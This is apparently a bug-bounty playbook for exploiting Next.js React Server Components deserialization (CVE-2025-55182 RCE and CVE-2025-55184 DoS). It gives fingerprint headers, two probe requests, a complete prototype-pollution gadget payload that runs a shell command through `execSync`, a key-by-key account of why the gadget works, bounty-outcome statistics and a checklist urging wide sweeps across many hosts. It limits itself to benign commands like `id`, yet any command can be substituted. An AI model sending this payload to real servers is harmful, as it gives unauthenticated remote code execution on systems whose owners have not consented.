# Next.js RSC Deserialization — CVE-2025-55182 (RCE) / CVE-2025-55184 (DoS)

## Contents

- [Fingerprint (one signature, many targets)](#fingerprint-one-signature-many-targets)
- [Root cause](#root-cause)
- [Safe 2-step probe (non-destructive, run in order)](#safe-2-step-probe-non-destructive-run-in-order)
- [RCE payload (benign command — CVE-2025-55182)](#rce-payload-benign-command--cve-2025-55182)
- [DoS payload — CVE-2025-55184](#dos-payload--cve-2025-55184)
- [Conversion reality](#conversion-reality)
- [Replay checklist](#replay-checklist)

Shared reference. `deserialization-hunting` and `rce-hunting` both point here; do
not duplicate this content into either skill. This is a mass-sweep play: one
fingerprint applies across many hosts, so sweep it broadly. Impact-first: the
`500`-with-RSC-body is the positive oracle, and a benign `id` in the `digest`
field is the proof.

## Fingerprint (one signature, many targets)

- `x-powered-by: Next.js`
- `content-type: text/x-component` on any Server Action response
- `vary: RSC, Next-Router-State-Tree`
- `x-nextjs-cache` / `x-nextjs-prerender`
- Next.js 15 + React Server Components + Server Actions enabled.

**Affected (verified against the CVE record and the vendor advisories, 2026-07-26):** `react-server-dom-{webpack,turbopack,parcel}` **19.0.0 / 19.1.0 / 19.1.1 / 19.2.0** — fixed in **19.0.1, 19.1.2, 19.2.1**, so 19.2.1 is a FIX, not a vulnerable version. Next.js: **>= 14.3.0-canary.77, all 15.x and all 16.x**, patched per minor branch at **15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7** — there is no single ceiling and **no stable 15.6.0**. A host on Next 16.0.0-16.0.6 IS vulnerable; a host on 15.5.7 is NOT. (CVE-2025-55184, the DoS, additionally affects 19.0.1 / 19.1.2 / 19.2.1.) Sweep the
fingerprint across every host first — it is one detection, reused everywhere.

## Root cause

Next.js deserializes the multipart Server Action payload through the React
deserializer **before** validating the action id. A prototype-pollution gadget
chain in that deserializer reaches `child_process.execSync` (unauth RCE,
CVE-2025-55182); a circular-reference payload hangs the worker (DoS,
CVE-2025-55184).

## Safe 2-step probe (non-destructive, run in order)

**Step 1 — Server Actions enabled?**

```
POST / HTTP/1.1
Next-Action: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa      (40 chars)
Content-Type: text/plain

```

Expect `404 Server action not found.` → Server Actions are enabled.

**Step 2 — vulnerable deser-before-validation path? (this is the oracle)**

```
POST / HTTP/1.1
Next-Action: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Content-Type: multipart/form-data; boundary=b

--b
Content-Disposition: form-data; name="1_0"

test
--b--
```

A **`500` whose body is an RSC stream** like `{"a":"$@1", ... }` CONFIRMS the
vulnerable path — the server deserialized the multipart payload before validating
the (bogus) action id. **Do NOT treat this 500 as a reason to stop.** It is the
positive result. Capture the body; it is your oracle.

## RCE payload (benign command — CVE-2025-55182)

Multipart body with three fields (`0`, `1`, `2`) and any `Next-Action` (a single
`x` is enough — the id is never validated, that is the whole bug).

**Send all eight keys. The gadget is not abbreviable.**

- Field `0` = JSON gadget:
  ```json
  {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": "{\"then\":\"$B1337\"}",
    "_response": {
      "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
      "_chunks": "$Q2",
      "_formData": {
        "get": "$1:constructor:constructor"
      }
    }
  }
  ```
- Field `1` = `"$@0"`
- Field `2` = `[]`

**`_formData.get` is the load-bearing key, and it is the one people drop.**
`_prefix` on its own is an inert string: the deserializer calls `_formData.get(...)`
to resolve a form field, and pointing that at `constructor:constructor` resolves it
to `Function`, so the call compiles `_prefix` as a function body and runs it.
`status: "resolved_model"` is what routes the chunk down the branch that touches
`_prefix` and `_formData` at all; `_chunks: "$Q2"` points chunk lookups at field
`2`'s empty array so the resolution does not throw first; `value` and `reason` keep
the chunk shaped like a real resolved model.

Drop any of them and the request still returns a `500` with an RSC body — the same
response the harmless step-2 probe produces. **That is why the omission is
dangerous: the failure looks exactly like the positive oracle, and it reads as
"vulnerable but the RCE didn't work" when in fact the gadget was never complete.**
Every corpus payload that actually returned command output carried all eight.

The command output is reflected back in the response as
`1:E{"digest":"<output>"}`. Use `id`, `whoami`, or `hostname` — these are the
non-destructive proofs the program wants. `whoami` returning `root` or `id`
returning `uid=1001(nextjs)` is a complete, payable unauth-RCE PoC.

**Read the digest before you call it RCE.** The DoS-path probe also answers
`1:E{"digest":"..."}`, but with a **bare integer** (`"digest":"4142722694"`) — that
is Next.js's own error hash, not your output. Command output is shell text
(`uid=1001(nextjs) gid=65533(nogroup)`). An all-digits digest means the gadget did
not execute.

Per the safe ladder: a benign command is rung 1-2 — run it. Do NOT escalate to
reverse shells, file writes, credential dumps, or persistence. If RoE restricts
RCE proof to UAT, run the command there and state prod-equivalent by inference.

## DoS payload — CVE-2025-55184

A circular-reference multipart payload hangs the worker. **Never send it against
prod** — that is a service-degradation action, rung-5+ and typically banned. The
`500`-body oracle above already proves the vulnerable deserializer without the DoS.
Note DoS-only submissions skew informative/low; the RCE variant is the one that
converts.

## Conversion reality

Six submissions of this family sit in the corpus, and their outcomes say something
blunter than "RCE pays":

| CVE | proof shipped | outcome |
|---|---|---|
| 55182 | full RCE, `id` / `whoami` output in the digest | duplicate |
| 55182 | full RCE, `id` output in the digest | duplicate |
| 55182 | full RCE, `id` output in the digest | P1, duplicate |
| 55184 | step-2 oracle only, DoS by inference | informative |
| 55184 | step-2 oracle only, DoS by inference | duplicate |
| 55184 | step-2 oracle only, DoS by inference | **resolved, bountied** |

**All three unauth-RCE proofs were duplicates. The one that paid proved less.**
On a CVE this well-known the scarce resource is not payload depth, it is an
unswept host — the RCE payload adds nothing on a host three people already
reported, and the oracle alone is enough on one nobody has touched. Sweep the
fingerprint wide and submit fast; do not spend the sweep window perfecting a
gadget.

- **The oracle is submittable on its own.** All three 55184 reports sent nothing
  but the two probes and argued the DoS by inference — never firing the circular
  payload — and one of them resolved with a bounty. You do not need to degrade a
  service to report that it is degradable.
- **Still prefer the RCE proof where the host is fresh**, since 55182 rates
  Critical against 55184's Low — but treat a duplicate as the expected outcome on
  any host with an obvious name, and let that push you further down the host list
  rather than deeper into the payload.
- Dedup is not optional here: this family is the single most duplicated technique
  in the corpus.

**Corpus cases:** RCE (55182) — `3456078`, `3456083`
(`h1/reports/3456078-zebra_vdp-duplicate.md`, `…3456083-zebra_vdp-duplicate.md`)
and `1d4f16a3999242e693efeb7814af5744`
(`bugcrowd/reports/1d4f16a3999242e693efeb7814af5744-rce-via-react-server-components-deserialization-vulnera.md`).
DoS/oracle (55184) — `3714474`
(`h1/reports/3714474-spotify-resolved.md`, the resolved one), `3714544`, `3714560`.
- Dedup before you call it new:
  `rg -i 'next.js rsc <host>' ~/Desktop/skills/personal-corpus/h1/index.md ~/Desktop/skills/personal-corpus/bugcrowd/index.md`,
  and — when the program has one — its live ledger under
  `targets/<program>/reports/`, which wins over any stale export. A match on the
  same primitive + same host is CLOSED: rotate to the next angle.

## Replay checklist

1. Fingerprint Next.js across all in-scope hosts (one signature).
2. Step-1 probe → `404 Server action not found.`
3. Step-2 multipart probe → `500` + RSC body = vulnerable (the oracle — don't bail).
4. If RCE is in scope, send the benign-command payload, capture the `digest`.
5. NEVER send the circular DoS payload against prod.
6. Validate, dedup, report first.
